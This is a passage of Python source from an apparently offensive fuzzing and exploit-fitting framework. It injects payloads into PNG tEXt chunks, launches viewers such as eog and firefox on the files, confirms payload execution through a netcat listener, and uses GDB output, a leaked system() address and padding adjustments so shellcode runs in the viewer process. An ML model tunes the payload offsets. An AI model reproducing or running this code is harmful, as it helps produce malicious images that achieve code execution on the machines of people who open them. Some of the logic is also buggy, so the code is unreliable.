        samples = load_and_process_data(data_dirs)

        if not samples:
            logger.warning("No historical fuzzing samples found for ML training.")
            return

        # Define chain types for the dataset
        # Use self.chain_types_for_ml which is initialized in __init__
        dataset = FuzzingDataset(samples, self.fuzz_types_for_ml, self.chain_types_for_ml, self.max_payload_offset, self.max_trigger_offset)
        
        # If model was not loaded or reinitialized due to mismatch, create a new one with correct dimensions
        if not self.ml_model or \
           (self.ml_model.encoder.fc1.in_features != dataset.input_dim or self.ml_model.decoder.fc3.out_features != dataset.output_dim):
            logger.info(f"Initializing/Updating VAEGAN model dimensions: input_dim={dataset.input_dim}, output_dim={dataset.output_dim}")
            self.ml_model = VAEGAN(input_dim=dataset.input_dim, latent_dim=20, output_dim=dataset.output_dim)
            self.ml_model.to(self.device)
            # If a model was previously loaded but had mismatch, try loading again with strict=False
            model_path = "models/vaegan_fuzzer_model.pth"
            if os.path.exists(model_path):
                try:
                    self.ml_model.load_state_dict(torch.load(model_path, map_location=self.device), strict=False)
                    logger.info(f"Re-loaded pre-trained VAEGAN model with updated dimensions from {model_path} (strict=False).")
                except Exception as e:
                    logger.error(f"Failed to re-load VAEGAN model after dimension update: {e}. Proceeding with fresh training.")

        if self.ml_model:
            logger.info("Starting VAE/GAN model training...")
            writer = SummaryWriter("runs/fuzzing")
            train_vaegan(self.ml_model, dataset, epochs=epochs, writer=writer, batch_size=32, device=self.device) # Use passed epochs
            writer.close()
            
            # Save the trained model
            model_path = "models/vaegan_fuzzer_model.pth"
            torch.save(self.ml_model.state_dict(), model_path)
            logger.info(f"Trained VAEGAN model saved to {model_path}")

            if generate_lime_explanations:
                logger.info("Generating LIME explanations...")
                # Prepare data for LIME
                train_data_np = np.array([item[0].cpu().numpy() for item in dataset])
                
                # Feature names for LIME
                feature_names = [
                    f"file_feature_{i}" for i in range(len(samples[0].file_features))
                ] + [
                    f"status_one_hot_{i}" for i in range(len(samples[0].status_one_hot))
                ] + [
                    f"gdb_crash_feature_{i}" for i in range(len(samples[0].gdb_crash_features))
                ] + [
                    f"leaked_addr_feature_{i}" for i in range(len(samples[0].leaked_addresses_features))
                ] + [
                    f"apport_crash_feature_{i}" for i in range(len(samples[0].apport_crash_features))
                ] + [
                    f"elf_feature_{i}" for i in range(len(samples[0].elf_features))
                ] + [
                    "normalized_payload_offset", "normalized_trigger_offset"
                ]

                # Initialize LIME explainers
                self.lime_explainer_fuzz_type = LimeExplainer(
                    model=self.ml_model,
                    feature_names=feature_names,
                    class_names=self.fuzz_types_for_ml,
                    data_sample=train_data_np,
                    mode="classification",
                    device=self.device
                )
                self.lime_explainer_payload_offset = LimeExplainer(
                    model=self.ml_model,
                    feature_names=feature_names,
                    class_names=None,
                    data_sample=train_data_np,
                    mode="regression",
                    max_payload_offset=self.max_payload_offset,
                    device=self.device
                )

                # Generate and log explanations for a sample instance
                if samples:
                    sample_instance_input = dataset[0][0].detach().clone().to(self.device).unsqueeze(0)
                    sample_instance_np = sample_instance_input.cpu().numpy().squeeze(0)

                    # Fuzz Type Explanation
                    try:
                        fuzz_type_explanation = self.lime_explainer_fuzz_type.explain_fuzz_type_prediction(sample_instance_np)
                        if fuzz_type_explanation:
                            writer_lime_fuzz = SummaryWriter("runs/lime_explanations/fuzz_type")
                            plot_and_log_lime_explanation(
                                writer_lime_fuzz, fuzz_type_explanation,
                                "LIME Explanation for Fuzz Type Prediction",
                                global_step=epochs, tag="LIME/FuzzType_Explanation"
                            )
                            writer_lime_fuzz.close()
                            logger.info("LIME fuzz_type explanation generated successfully")
                    except Exception as e:
                        logger.error(f"Error generating LIME explanation for fuzz type: {e}")
                        import traceback
                        logger.error(traceback.format_exc())

                    # Payload Offset Explanation
                    try:
                        payload_offset_explanation = self.lime_explainer_payload_offset.explain_payload_offset_prediction(sample_instance_np)
                        if payload_offset_explanation:
                            writer_lime_payload = SummaryWriter("runs/lime_explanations/payload_offset")
                            plot_and_log_lime_explanation(
                                writer_lime_payload, payload_offset_explanation,
                                "LIME Explanation for Payload Offset Prediction",
                                global_step=epochs, tag="LIME/PayloadOffset_Explanation"
                            )
                            writer_lime_payload.close()
                            logger.info("LIME payload_offset explanation generated successfully")
                    except Exception as e:
                        logger.error(f"Error generating LIME explanation for payload offset: {e}")
                        import traceback
                        logger.error(traceback.format_exc())
                else:
                    logger.warning("No samples available to generate LIME explanations.")
        else:
            logger.error("VAEGAN model not initialized, cannot train.")
    
    def dump_viewer_output(self, viewer_name: str, stdout: str, stderr: str):
        """Dumps the viewer output to a log file for analysis."""
        if not stdout and not stderr:
            return
        
        timestamp = int(time.time())
        log_dir = os.path.join("logs", "viewer_outputs", viewer_name)
        os.makedirs(log_dir, exist_ok=True)
        log_path = os.path.join(log_dir, f"{viewer_name}_output_{timestamp}.log")
        try:
            with open(log_path, 'w') as f:
                f.write(f"=== STDOUT ===\n{stdout}\n\n=== STDERR ===\n{stderr}\n")
            logger.info(f"Viewer output dumped to {log_path}")

        except Exception as e:
            logger.error(f"Failed to dump viewer output: {e}") 
            import traceback

    def get_intelligent_suggestion(self, viewer: Dict, original_file_path: str,
                                   current_fuzz_type: str, current_payload_offset: int) -> InstrumentationSuggestion:
        """Queries the trained VAE/GAN for an instrumentation suggestion."""
        if not self.ml_model:
            logger.warning("ML model not loaded, returning default suggestion.")
            return InstrumentationSuggestion(fuzz_type_prediction=current_fuzz_type, payload_offset_prediction=current_payload_offset)

        # Extract features from the current context
        # This needs to match the input feature vector used in FuzzingDataset
        file_features = _extract_file_features(original_file_path) # Use data_processor's internal function
        # Dummy status, gdb, leaked, apport features for current context (no crash yet)
        status_one_hot = [0.0, 0.0, 0.0, 0.0, 0.0] # Assuming initial state is not crashed/successful
        gdb_crash_features = [0.0] * 5
        leaked_addresses_features = [0.0] * 3
        apport_crash_features = [0.0] * 5
        venv_python = os.path.expanduser("~/nvenv/bin/python")
        # Determine ELF path for the viewer (same logic as in data_processor.py)
        viewer_elf_paths = {
            "png_consumer": "./png_consumer", # Local executable
            # Add other specific mappings if needed
            "firefox":"/snap/bin/firefox",
            "PIL": f"{venv_python}", # Assuming pil_loader.py is run with venv python
            "eog":"/usr/bin/eog" 
            
            }
        
        elf_path = viewer_elf_paths.get(viewer['name'], f"/usr/bin/{viewer['name']}")
        #check if the path exists, if not fallback to /usr/bin/viewer_name
        if not os.path.exists(elf_path):
            logger.error(f"ELF path {elf_path} for viewer {viewer['name']} does not exist. Falling back to /usr/bin/{viewer['name']}") 
            exit(1)
        elf_features = _extract_elf_features(elf_path) # Extract ELF features

        normalized_payload_offset = current_payload_offset / self.max_payload_offset
        current_trigger_offset = 0 # Placeholder for now, will be passed from _fuzz_single_combination
        normalized_trigger_offset = current_trigger_offset / self.max_trigger_offset


        input_features_list = (
            normalize_feature_vector(file_features) +
            status_one_hot +
            gdb_crash_features +
            leaked_addresses_features +
            apport_crash_features +
            normalize_feature_vector(elf_features) +
            [normalized_payload_offset, normalized_trigger_offset]
        )
        input_features_tensor = torch.tensor(input_features_list, dtype=torch.float32).to(self.device)

        suggestion, _ = generate_suggestion(self.ml_model, input_features_tensor, # Unpack suggestion and raw_output
                                         self.fuzz_types_for_ml, self.chain_types_for_ml, # Pass chain_types_for_ml
                                         self.max_payload_offset, self.max_trigger_offset, device=self.device) # Explicitly pass device as keyword argument
        return suggestion

    def _check_for_new_apport_crashes(self, current_fuzzed_file_path: str, current_timestamp: float) -> Optional[ApportCrashInfo]:
        """
        Checks for new Apport crashes and tries to associate them with the current fuzzing session.
        """
        new_log_lines, self.crash_monitor_last_read_pos = monitor_apport_log(self.crash_monitor_last_read_pos)
        
        for line in new_log_lines:
            # Apport log lines often look like:
            # Feb 04 22:00:00 hostname apport[1234]: Report 'crash_report_path.crash' already exists
            # Or:
            # Feb 04 22:00:00 hostname kernel: [12345.678901] program_name[PID]: segfault at ...
            
            # Look for lines indicating a new crash report file
            match = re.search(r"Report '(/var/crash/_usr_bin_.*?\.crash)'", line)
            if match:
                report_path = match.group(1)
                apport_info = parse_apport_report(report_path)
                if apport_info:
                    # Try to associate the crash with the current fuzzed file
                    # This is a heuristic: check if the crash time is close to the fuzzing time
                    # and if the associated file (if any) matches the fuzzed file.
                    if apport_info.crash_time and abs(apport_info.crash_time - current_timestamp) < 60: # Within 60 seconds
                        if apport_info.associated_file and current_fuzzed_file_path in apport_info.associated_file:
                            logger.critical(f"Apport crash detected and associated with current fuzzing session: {report_path}")
                            return apport_info
                        elif apport_info.executable and any(v['name'] in apport_info.executable for v in self.viewers):
                            # If no specific file, but viewer executable crashed, it's likely related
                            logger.critical(f"Apport crash detected for viewer executable: {report_path}")
                            return apport_info
        return None
    
    def start_viewer_suspended(self, viewer_cmd: str, file_path: str, unique_id: str, env: dict = None) -> Optional[int]:
        """Starts a viewer process in suspended mode and returns its PID."""
        viewer_cmd_full = viewer_cmd if isinstance(viewer_cmd, list) else [viewer_cmd]
        viewer_path = viewer_cmd_full[0]
        if not os.path.exists(viewer_path):
            logger.error(f"Viewer executable not found: {viewer_path}")
            return None
        try:
            cmd = viewer_cmd_full + [file_path]
            viewer_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
            viewer_pid = viewer_process.pid
            key = f"{unique_id}:{file_path}"
            start_time = time.time()
            env = env.copy() if env else {}
            env["INFECTION_UNIQUE_ID"] = unique_id

            with _suspended_viewer_lock:
                _suspended_viewer_processes[key] = {
                    'pid': viewer_pid,
                    'process': viewer_process,
                    'unique_id': unique_id,
                    'file_path': file_path,
                    'start_time': start_time,
                    'env': env,
                    'viewer_cmd': viewer_cmd_full
                }
            logger.debug(f"Started viewer {viewer_path} with PID {viewer_pid} to load {file_path}")
            return viewer_pid
        except Exception as e:
            logger.error(f"Failed to start viewer {viewer_path}: {e}")
            return None
    
    def resume_viewer_process(self, unique_id: str, file_path: str) -> bool:
        """Resumes a suspended viewer process using GDB."""
        try:
            gdb_cmd = [
                "gdb", "--batch", "-ex", f"attach $(pgrep -f '{file_path}')", "-ex", "set pagination off", "-ex", "continue"
            ]
            logger.debug(f"Running GDB to resume viewer process: {' '.join(gdb_cmd)}")
            subprocess.run(gdb_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
            return True
        except subprocess.TimeoutExpired:
            logger.warning(f"GDB command timed out while trying to resume viewer for {file_path}")
            return False
        except Exception as e:
            logger.error(f"Error while trying to resume viewer process with GDB: {e}")
            return False
        
    def fuzz_viewer(self, viewer: Dict, file_path: str, unique_id: str, payload: str, nc_process: subprocess.Popen = None, nc_output_file: str = None) -> tuple[str, Optional[Dict]]:  # Updated signature
        """Runs a specific viewer against an infected file and attempts payload fitting."""
        logger.info(f"Testing viewer {viewer['name']} with {file_path}...")
        
        # Ensure file exists before attempting to run viewer
        if not os.path.exists(file_path):
            logger.error(f"Cannot run {viewer['name']}: file does not exist: {file_path}")
            return "FAILED", None

        proc = None
        if callable(viewer["cmd"]):
            logger.debug(f"Executing callable viewer command: {viewer['cmd'].__name__} with {file_path}")
            viewer["cmd"](file_path)
        else:
            try:
                # Start viewer suspended for controlled execution and GDB analysis
                env = os.environ.copy()
                suspended_pid = self.start_viewer_suspended(viewer["cmd"], file_path, unique_id, env)
                # If the viewer was started successfully in suspended mode, attempt to resume and monitor it
                # process will get stuck here for some reason.
                if suspended_pid:
                    logger.info(f"Viewer {viewer['name']} started suspended with PID {suspended_pid}")
                    
                    # Resume the viewer process to let it execute
                    if resume_viewer_process(unique_id, file_path):
                        logger.debug(f"Resumed viewer {viewer['name']} process {suspended_pid}")
                        
                        # Let the process run for a reasonable time before GDB analysis
                        # Don't wait for completion as external viewers may not exit cleanly
                        time.sleep(2)  # Give the process time to execute and potentially crash
                        
                        # Check if process is still running
                        try:
                            os.kill(suspended_pid, 0)  # Signal 0 just checks if process exists
                            logger.debug(f"Viewer {viewer['name']} process {suspended_pid} is still running")
                        except OSError:
                            logger.debug(f"Viewer {viewer['name']} process {suspended_pid} has exited")
                    
                    # Clean up the suspended viewer process
                    cleanup_suspended_viewer(unique_id, file_path)
                else:
                    # Fallback to regular execution if suspended startup fails
                    logger.warning(f"Failed to start {viewer['name']} suspended, falling back to regular execution")
                    cmd = viewer["cmd"] + [file_path]
                    
                    # Run viewer WITHOUT instrumentation SO for payload execution
                    # (SO is only used for diagnostics if payload execution fails)
                    env_for_run = os.environ.copy()
                    
                    logger.debug(f"Executing viewer command (clean environment): {' '.join(cmd)}")
                    # For png_consumer, capture output to get crash callstack if available
                    if viewer["name"] == "png_consumer":
                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env_for_run, text=True)
                    else:
                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env_for_run, text=True)
                    try:
                        if viewer["name"] in ["eog", "firefox"]:
                            logger.debug(f"External viewer {viewer['name']} started; waiting briefly for startup")
                            time.sleep(5)
                        else:
                            proc.wait(timeout=10)
                    except subprocess.TimeoutExpired:
                        logger.warning(f"Viewer {viewer['name']} timed out for {file_path}")
                        try:
                            proc.terminate()
                            proc.wait(timeout=3)
                        except Exception:
                            try:
                                proc.kill()
                            except Exception:
                                pass
                    finally:
                        stdout = stderr = ""
                        if proc.poll() is not None:
                            try:
                                if viewer["name"] == "png_consumer":
                                    # For png_consumer, collect output to get crash callstack
                                    stdout, _ = proc.communicate(timeout=5)
                                else:
                                    stdout, stderr = proc.communicate(timeout=5)
                            except subprocess.TimeoutExpired:
                                logger.warning(f"Timed out while collecting output from {viewer['name']}")
                                try:
                                    proc.kill()
                                except Exception:
                                    pass
                                stdout, stderr = proc.communicate(timeout=5) if proc.poll() is not None else ("", "")
                        else:
                            logger.debug(f"{viewer['name']} process still running after execution; skipping communicate")
                        logger.debug(f"{viewer['name']} stdout: {stdout.strip()}")
                        logger.debug(f"{viewer['name']} stderr: {stderr.strip()}")
                        
                        # If png_consumer produced output, analyze it for success, vulnerability, or crash indicators
                        if viewer["name"] == "png_consumer" and stdout:
                            crash_info = self._parse_crash_callstack(stdout)
                            
                            # Check for successful completion
                            if crash_info["has_success"]:
                                logger.info(f"png_consumer completed successfully: {', '.join(crash_info['success_indicators'])}")
                            
                            # Check for vulnerability trigger
                            if crash_info["has_vulnerability"]:
                                logger.info(f"png_consumer vulnerability triggered: {', '.join(crash_info['success_indicators'][:2])}")
                            
                            # Check for crash
                            if crash_info["has_crash"]:
                                logger.info(f"png_consumer crashed in {crash_info['faulting_module']}")
                                if crash_info["signal"]:
                                    logger.info(f"  Signal: {crash_info['signal']}")
                                if crash_info["crash_offset"]:
                                    logger.info(f"  Offset: 0x{crash_info['crash_offset']:x}")
                                if crash_info["top_frames"]:
                                    logger.debug(f"  Frames: {crash_info['top_frames'][:2]}")
                            
                            # Log any error messages detected
                            if crash_info["error_messages"]:
                                logger.warning(f"png_consumer errors: {crash_info['error_messages'][:2]}")
                            
                            # Save output for debugging
                            try:
                                with open(f"{file_path}.output.log", 'w') as f:
                                    f.write(stdout)
                                if crash_info["has_crash"] or crash_info["error_messages"]:
                                    with open(f"{file_path}.crash.log", 'w') as f:
                                        f.write(stdout)
                            except:
                                pass
                        
            except Exception as e:
                logger.error(f"Error running {viewer['name']}: {e}")

        # Add a small delay to allow netcat output to be written
        time.sleep(1)

        executed_log = verify_payload_execution(
            unique_id,
            viewer["name"],
            payload,
            timeout=10,
            nc_process=nc_process,
            nc_output_file=nc_output_file,
            viewer_process=proc,
        )  # Increased timeout to 10 seconds

        if proc is not None:
            stdout_text, stderr_text = _stop_process_and_collect_output(proc, viewer["name"])
            if stdout_text:
                logger.debug(f"Final stdout for {viewer['name']}: {stdout_text.strip()}")
            if stderr_text:
                logger.debug(f"Final stderr for {viewer['name']}: {stderr_text.strip()}")

        if executed_log:
            return "SUCCESS", None # Return None for fitting_info when successful

        # Payload execution not confirmed; retry WITH instrumentation SO for diagnostics
        if viewer["name"] in ["eog", "firefox"]:
            so_path = os.path.abspath("./png_instrumentation.so")
            if os.path.exists(so_path):
                logger.info(f"Payload execution not confirmed for {viewer['name']}. Retrying WITH instrumentation SO for diagnostic information.")
                try:
                    env_with_instrument = os.environ.copy()
                    lib_dir = os.path.dirname(so_path)
                    current_ld_library_path = env_with_instrument.get("LD_LIBRARY_PATH", "")
                    env_with_instrument["LD_LIBRARY_PATH"] = f"{lib_dir}:{current_ld_library_path}" if current_ld_library_path else lib_dir

                    current_ld_preload = env_with_instrument.get("LD_PRELOAD", "")
                    env_with_instrument["LD_PRELOAD"] = f"{so_path}:{current_ld_preload}" if current_ld_preload else so_path
                    logger.debug(f"Injected instrumentation SO into {viewer['name']} for diagnostics: {so_path}")
                    
                    cmd = viewer["cmd"] + [file_path]
                    logger.debug(f"Re-running viewer WITH instrumentation for diagnostics: {' '.join(cmd)}")
                    if viewer["name"] == "png_consumer":
                        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env_with_instrument, text=False)
                    else:
                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env_with_instrument, text=True)
                    try:
                        logger.debug(f"External viewer {viewer['name']} started with instrumentation; waiting briefly for startup")
                        time.sleep(5)
                    except subprocess.TimeoutExpired:
                        logger.warning(f"Instrumented diagnostic run timed out for {viewer['name']} on {file_path}")
                        try:
                            proc.terminate()
                            proc.wait(timeout=3)
                        except Exception:
                            try:
                                proc.kill()
                            except Exception:
                                pass
                    finally:
                        if proc.poll() is not None and viewer["name"] != "png_consumer":
                            try:
                                stdout, stderr = proc.communicate(timeout=5)
                                logger.debug(f"Instrumented diagnostic run stdout: {stdout.strip()}")
                                logger.debug(f"Instrumented diagnostic run stderr: {stderr.strip()}")
                            except subprocess.TimeoutExpired:
                                logger.warning(f"Timed out while collecting output from instrumented diagnostic run")
                                try:
                                    proc.kill()
                                except Exception:
                                    pass
                        elif proc.poll() is None:
                            logger.debug(f"{viewer['name']} process still running after instrumented diagnostic run; skipping communicate")
                    time.sleep(1)
                    executed_log = verify_payload_execution(
                        unique_id,
                        viewer["name"],
                        payload,
                        timeout=10,
                        nc_process=nc_process,
                        nc_output_file=nc_output_file,
                        viewer_process=proc,
                    )
                    if executed_log:
                        logger.info(f"Payload execution confirmed with instrumentation for {viewer['name']} (diagnostics helpful)")
                        return "SUCCESS", None
                except Exception as e:
                    logger.warning(f"Instrumented diagnostic run failed for {viewer['name']}: {e}")

        if not callable(viewer["cmd"]):
            gdb_output, payload_addr = run_under_gdb(viewer["cmd"], file_path, unique_id)
            
            if payload_addr:
                logger.info(f"Payload string '{unique_id}' found at {hex(payload_addr)} in {viewer['name']} memory!")
                modifications = []
                reg_pattern = re.compile(r'^([a-z0-9]+)\s+(0x[0-9a-f]+)', re.MULTILINE | re.IGNORECASE)
                for match in reg_pattern.finditer(gdb_output):
                    reg_name, reg_val_str = match.groups()
                    try:
                        reg_val = int(reg_val_str, 16)
                        offset = payload_addr - reg_val
                        if abs(offset) < 0x10000:
                            modifications.append(f"Register {reg_name} is at {hex(reg_val)} (offset {hex(offset)} from payload)")
                    except ValueError: continue
                
                if modifications:
                    logger.info("FITTING_SUGGESTIONS:")
                    for mod in modifications:
                        logger.info(f"  * {mod}")
                    with open(f"{file_path}.fitting.log", "w") as f:
                        f.write("\n".join(modifications))
                    #apply modifications to the file for fitting (this is a placeholder, actual implementation would depend on the specific modifications needed) 
                    if self._apply_fitting_modification(file_path, modifications): # This function would need to be implemented to actually modify the file based on the suggestions 
                        logger.debug(f"Applied fitting modifications to {file_path}: {modifications}")
                        logger.debug('Re-running viewer with modified file for fitting...')
                        logger.info(f"Successfully applied fitting modifications to {file_path} , re-evaluating viewer... ")
                        #return self.fuzz_viewer(viewer, file_path, unique_id) # Re-run the viewer with the modified file for fitting 
                    
                    else:
                        logger.warning(f"Failed to apply fitting modifications to {file_path}")
                # Return the payload address and modifications for fitting
                return "PAYLOAD_FOUND_FITTING_CALCULATED", {"payload_addr": payload_addr, "offsets": modifications}

            if "Program received signal" in gdb_output or "Segmentation fault" in gdb_output:
                logger.warning(f"Viewer {viewer['name']} crashed! Performing deep analysis...")
                analysis = analyze_crash(gdb_output, viewer["name"], viewer["cmd"]) # Pass viewer["cmd"]
                with open(f"{file_path}.{viewer['name']}.crash.log", "w") as f:
                    f.write(gdb_output)
                with open(f"{file_path}.{viewer['name']}.analysis.json", "w") as f:
                    json.dump(analysis, f, indent=2)
                
                # Check for "unsigned integer out-of-range" error
                if "unsigned integer out-of-range" in gdb_output.lower() or "invalid length" in gdb_output.lower():
                    logger.error(f"CRITICAL ERROR: Viewer {viewer['name']} reported unsigned integer out-of-range or invalid length. This weakness category might be invalid.")
                    return "CRASHED_INVALID_WEAKNESS", None
                
                return "CRASHED", None
        
        return "FAILED", None # Return None for fitting_info when failed
    def _apply_fitting_modification(self, file_path: str, modifications: List[str]):
        """Applies modifications to the file based on fitting suggestions (placeholder implementation)."""
        # Parse the modifications returned by GDB and adjust the InfectionPayload
        # padding so the payload moves closer to the target registers on the
        # next retry. The modifications list contains strings like:
        # "Register x0 is at 0x... (offset 0x... from payload)"
        try:
            if not modifications:
                logger.warning("No fitting modifications provided")
                return False

            offsets = {}
            reg_re = re.compile(r"Register\s+([a-z0-9]+)\s+is at\s+(0x[0-9a-f]+)\s*\(offset\s*(-?0x[0-9a-f]+)", re.IGNORECASE)
            for line in modifications:
                m = reg_re.search(line)
                if m:
                    reg = m.group(1).lower()
                    try:
                        off = int(m.group(3), 16)
                    except ValueError:
                        continue
                    offsets[reg] = off

            # Separate PC offset from register offsets
            pc_offset = offsets.get('pc', None)
            non_pc = {r: o for r, o in offsets.items() if r != 'pc'}
            if not non_pc:
                logger.error("Fitting calculation appears incorrect: only PC changed or no usable registers in fitting info.")
                return False
            
            #calculate offset x0 from system offset and leaked system address 
            offset_delta = self.leaks.get("system", 0) - self.leaks.get("payload", 0)
            logger.info(f"Calculated offset delta from leaked addresses: {hex(offset_delta)} (system - payload)")
            # Adjust non-PC offsets by the calculated offset delta to estimate where x0 should be for system() call
            adjusted_non_pc = {r: o + offset_delta for r, o in non_pc.items()}

            # Use median of non-PC offsets to be robust against outliers
            med_offset = int(np.median(list(adjusted_non_pc.values())))
            logger.info(f"Median non-PC offset: {hex(med_offset)} from registers: {list(adjusted_non_pc.keys())}")
            

            # If PC is exactly at payload start (offset 0), we must move the payload
            # forward (increase padding) so that preceding shellcode bytes are executed
            # before the payload string. Conversely, if PC is not at payload, we move
            # the payload toward the registers by subtracting med_offset.
            if pc_offset is not None and pc_offset == 0:
                # Default gap to allow shellcode to run (bytes). Tunable.
                desired_gap = 64
                logger.info(f"PC is at payload start; increasing padding by {desired_gap} to place payload after shellcode")
                pad_delta = desired_gap
            else:
                # Move payload toward registers by med_offset
                pad_delta = -med_offset

            # Locate the InfectionPayload tEXt chunk in the PNG and adjust padding
            with open(file_path, 'rb') as f:
                content = bytearray(f.read())

            p_key = b"INJECTED_PAYLOAD"
            search_pattern = b"tEXt" + p_key
            idx = content.find(search_pattern)
            if idx == -1:
                logger.error("Could not find INJECTED_PAYLOAD tEXt chunk in file for fitting modification")
                return False

            # chunk_type_pos points at 'tEXt', chunk_length_pos is 4 bytes before it
            chunk_type_pos = idx
            chunk_length_pos = chunk_type_pos - 4
            old_length = int.from_bytes(content[chunk_length_pos:chunk_type_pos], 'big')
            chunk_data_start = chunk_type_pos + 4
            chunk_data_end = chunk_data_start + old_length
            p_data = content[chunk_data_start:chunk_data_end]

            # p_data structure: p_key + b"\x00" + padding (A*s) + final_payload
            key_marker = p_key + b"\x00"
            if not p_data.startswith(key_marker):
                logger.error("INJECTED_PAYLOAD chunk data not in expected format")
                return False

            after_key = p_data[len(key_marker):]
            # count consecutive 'A' (0x41) bytes as current padding
            cur_pad = 0
            for b in after_key:
                if b == 0x41:
                    cur_pad += 1
                else:
                    break

            # New padding calculation uses pad_delta determined above
            new_pad = int(cur_pad + pad_delta)
            if new_pad < 0:
                new_pad = 0

            if new_pad == cur_pad:
                logger.info("Calculated padding equal to current padding; no change applied")
                return False

            # Reconstruct p_data with new padding and preserve rest of payload
            rest_payload = after_key[cur_pad:]
            new_p_data = key_marker + (b"A" * new_pad) + rest_payload
            new_length = len(new_p_data)
            new_crc = calculate_png_crc(b"tEXt", new_p_data)

            # Replace the chunk in content
            new_chunk = new_length.to_bytes(4, 'big') + b"tEXt" + new_p_data + new_crc
            content[chunk_length_pos:chunk_data_end+4] = new_chunk

            #update CRC of the next chunk (IEND) if it exists, since we modified the file content before it to ensure file integrity 
            iend_pos = content.find(b"IEND")
            if iend_pos != -1:
                # IEND chunk is 12 bytes: 4 bytes length + 4 bytes type + 4 bytes data + 4 bytes CRC
                iend_start = iend_pos - 4 # Start of IEND chunk (length field)
                iend_length = int.from_bytes(content[iend_start:iend_start+4], 'big')
                iend_data_start = iend_start + 8 # Start of IEND data (after length and type)
                iend_data_end = iend_data_start + iend_length
                old_iend_crc = int.from_bytes(content[iend_data_end:iend_data_end+4], 'big')
                new_iend_crc = calculate_png_crc(b"IEND", content[iend_data_start:iend_data_end])
                #new_iend_crc is already bytes, so we can directly replace the old CRC with the new one
                if new_iend_crc != old_iend_crc:
                    content[iend_data_end:iend_data_end+4] = new_iend_crc[0:4] # Ensure we only take 4 bytes for CRC  
            

            # Write back file
            with open(file_path, 'wb') as f:
                f.write(content)

            logger.info(f"Applied fitting modification: padding {cur_pad} -> {new_pad} for {file_path}")
            return True
        except Exception as e:
            logger.error(f"Error applying fitting modification: {e}")
            logger.debug(traceback.format_exc())
            return False
        
    

    def _select_chunk_injection_strategy(self, retry_attempt: int, base_file_name: str = "") -> Optional[str]:
        """Choose a chunk injection strategy for a given fuzzing attempt."""
        strategy_names = list(get_png_chunk_injection_strategies().keys())
        if not strategy_names:
            return None
        seed = retry_attempt
        if base_file_name:
            seed += sum(ord(ch) for ch in os.path.basename(base_file_name))
        return strategy_names[seed % len(strategy_names)]

    def _fuzz_single_combination(self, original_file_path: str, base_file_name: str, viewer: Dict, fuzz_type: str, output_dir: str, invalid_fuzz_types: set) -> List[Dict]:
        """Fuzzes a single file with a specific viewer and fuzz_type, including retries and offset adjustments."""
        viewer_name = viewer["name"]
        results_for_combination = []
        
        if fuzz_type in invalid_fuzz_types:
            logger.info(f"Skipping {fuzz_type} for {viewer_name} due to previous invalidation.")
            return []

        key = (base_file_name, viewer_name, fuzz_type)
        if hasattr(self, 'inferred_crashed_trajectories') and key in self.inferred_crashed_trajectories:
            logger.info(f"Re-running inferred-crash trajectory: {key} (previous status corrected to CRASHED_INFERRED)")

        max_retries = 5 # Increased retries for more robust fitting
        current_payload_offset = 0
        current_trigger_offset = 0 # New: for intelligent suggestions
        
        # List of additional offsets to try if initial fitting fails
        additional_offsets = [0x8, 0x10, 0x18, 0x20, 0x28, 0x30] # Common small offsets
        tried_offsets = set()
        
        # Intelligent suggestion logic
        if not self.use_legacy and (self.use_intelligent or self.use_advisor):
            if self.ml_model:
                suggestion = self.get_intelligent_suggestion(viewer, original_file_path, fuzz_type, current_payload_offset)
                if self.use_advisor:
                    logger.info(f"ADVISOR: Suggested fuzz_type='{suggestion.fuzz_type_prediction}', "
                                f"payload_offset={suggestion.payload_offset_prediction}, "
                                f"trigger_offset={suggestion.trigger_offset_prediction} (Confidence: {suggestion.confidence:.2f})")
                if self.use_intelligent:
                    logger.info(f"INTELLIGENT: Applying suggestion: fuzz_type='{suggestion.fuzz_type_prediction}', "
                                f"payload_offset={suggestion.payload_offset_prediction}, "
                                f"trigger_offset={suggestion.trigger_offset_prediction}")
                    fuzz_type = suggestion.fuzz_type_prediction
                    current_payload_offset = suggestion.payload_offset_prediction
                    current_trigger_offset = suggestion.trigger_offset_prediction
                    # Add the initial intelligent suggestion to tried_offsets to avoid immediate re-suggestion
                    tried_offsets.add(current_payload_offset)
            else:
                logger.warning("ML model not loaded, intelligent suggestions are disabled.")

        for retry_attempt in range(max_retries):
            logger.info(f"Testing {viewer['name']} with {fuzz_type} on {base_file_name} (Retry {retry_attempt}, Offset {current_payload_offset}, Trigger Offset {current_trigger_offset})...")
            
            test_file_name = f"{(base_file_name)}.{viewer_name}.{fuzz_type}.retry{retry_attempt}.png"
            test_file_path = os.path.join(output_dir, test_file_name) # Use output_dir directly
            
            test_file_name = f"{(base_file_name)}.{viewer_name}.{fuzz_type}.retry{retry_attempt}.png"
            test_file_path = os.path.join(output_dir, test_file_name) # Use output_dir directly
            
            # Ensure the test file exists by copying the original
            try:
                # Ensure parent directories exist for the test_file_path
                os.makedirs(os.path.dirname(test_file_path), exist_ok=True)
                shutil.copy2(original_file_path, test_file_path)
            except FileNotFoundError:
                logger.error(f"Original file not found: {original_file_path}. Cannot create test file.")
                # Create a dummy empty file to avoid subsequent FileNotFoundError in inject_payload_with_leaks
                with open(test_file_path, 'wb') as f:
                    f.write(b'')
                injection_success = False # Mark injection as failed
                logger.error(f"Payload injection failed for {viewer_name} + {fuzz_type} (Retry {retry_attempt}) due to missing original file.")
                results_for_combination.append({
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": "INJECTION_FAILED",
                    "payload_validated": False,
                    "platform": self.platform_id,
                    "timestamp": time.time(),
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset,
                    "retry_attempt": retry_attempt,
                    "reason": "original file missing"
                })
                continue # Skip to next retry/combination
            except Exception as e:
                logger.error(f"Error copying original file to {test_file_path}: {e}")
                # Create a dummy empty file to avoid subsequent FileNotFoundError in inject_payload_with_leaks
                with open(test_file_path, 'wb') as f:
                    f.write(b'')
                injection_success = False # Mark injection as failed
